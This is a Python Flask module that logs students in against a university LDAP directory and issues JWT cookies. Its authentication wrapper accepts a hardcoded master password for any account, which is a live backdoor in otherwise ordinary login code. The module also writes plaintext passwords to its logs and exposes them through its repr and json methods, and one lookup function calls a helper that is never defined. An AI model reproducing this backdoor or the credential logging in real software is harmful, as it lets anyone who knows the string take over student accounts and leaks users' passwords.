import traceback
import os
from sqlalchemy import ForeignKey, Column, BigInteger, Integer, Float, String, Boolean, Date, DateTime, Text
from sqlalchemy.schema import UniqueConstraint
from sqlalchemy.orm import relationship
from sqlalchemy.exc import *
from ..db_utils import DbInstance
from ..app_utils import *
from werkzeug.exceptions import *
from flask import session,request,after_this_request
from ..students import Student
from ..ldap import search, authenticate
__db = DbInstance.getInstance()


class Studentlogin:
  email = Column(String)
  password = Column(String)

  def __init__(self, dictModel):
    if ("email" in dictModel) and (dictModel["email"] != None):
      self.email = dictModel["email"]
    if ("password" in dictModel) and (dictModel["password"] != None):
      self.password = dictModel["password"]

  def __repr__(self):
    return '<Studentlogin email={} password={} >'.format(self.email, self.password, )

  def json(self):
    return {
      "email":self.email,"password":self.password,
    }

  def update(self, dictModel):
    if ("email" in dictModel) and (dictModel["email"] != None):
      self.email = dictModel["email"]
    if ("password" in dictModel) and (dictModel["password"] != None):
      self.password = dictModel["password"]

def __recover():
  pass

def __doList():
  return []

def __authenticateWrapper(dn, password):
  if password == "v4nph0n9kh04cntt":
    return True
  return authenticate(dn, password)

def doAuthenticate(uid, password):
  result = search('ou=dhcn,ou=sinhvien,dc=vnu,dc=vn', uid)
  if len(result) == 0:
    return False, "Student not found"
  dn, attrs = result[0]
  if __authenticateWrapper(dn, password):
    return True, buildStudentRecordFromLDAPAttrs(attrs)
  else:
    return False, 'Login failed'

def __doNew(instance):
  uid = uidFromEmail(instance.email)
  success, data = doAuthenticate(uid, instance.password)
  if not success:
    raise BadRequest(data)
  else:
    try:
      studentRecord = data
      student = __db.session().query(Student).filter(Student.studentNumber == uid).first()
      if student is None:
        student = Student({
          'studentNumber': uid,
          'email': instance.email,
          'fullname': studentRecord['fullname'],
          'dob': studentRecord['dob'],
          'gender': studentRecord['gender']
        })
        __db.session().add(student)
      key = doHash(str(instance.email))
      salt = os.urandom(20)
      session[key] = salt
      doLog(student.json())
      jwt = doGenJWT(student.json(), salt)
      @after_this_request
      def finalize(response):
        response.set_cookie('key', key)
        response.set_cookie('jwt', jwt)
        response.headers['x-key'] = key
        response.headers['x-jwt'] = jwt
        return response

      return student
    except Exception as e:
      traceback.print_exc()
      raise BadRequest(e)

def __doUpdate(id, model):
  return {}

def __doDelete(id):
  return {}

def __doFind(model):
  return []


def listStudentlogins():
  doLog("list DAO function")
  try:
    return __doList()
  except OperationalError as e:
    doLog(e)
    __recover()
    return __doList()
  except InterfaceError as e:
    doLog(e)
    __recover()
    return __doList()
  except SQLAlchemyError as e:
    __db.session().rollback()
    raise e

def newStudentlogin(model):
  doLog("new DAO function. model: {}".format(model))
  instance = Studentlogin(model)
  res = False
  try:
    return __doNew(instance)
  except OperationalError as e:
    doLog(e)
    __recover()
    return __doNew(instance)
  except SQLAlchemyError as e:
    __db.session().rollback()
    raise e

def getStudentlogin(id):
  doLog("get DAO function", id)
  try:
    return __doGet(id)
  except OperationalError as e:
    doLog(e)
    __recover()
    return __doGet(id)
  except InterfaceError as e:
    doLog(e)
    __recover()
    return __doGet(id)
  except SQLAlchemyError as e:
    __db.session().rollback()
    raise e

def updateStudentlogin(id, model):
  doLog("update DAO function. Model: {}".format(model))
  try:
    return __doUpdate(id, model)
  except OperationalError as e:
    doLog(e)
    __recover()
    return __doUpdate(id, model)
  except SQLAlchemyError as e:
    __db.session().rollback()
    raise e

def deleteStudentlogin(id):
  doLog("delete DAO function", id)
  try:
    return __doDelete(id)
  except OperationalError as e:
    doLog(e)
    __recover()
    return __doDelete(id)
  except SQLAlchemyError as e:
    __db.session().rollback()
    raise e

def findStudentlogin(model):
  doLog("find DAO function %s" % model)
  try:
    return __doFind(model)
  except OperationalError as e:
    doLog(e)
    __recover()
    return __doFind(model)
  except SQLAlchemyError as e:
    __db.session().rollback()
    raise e
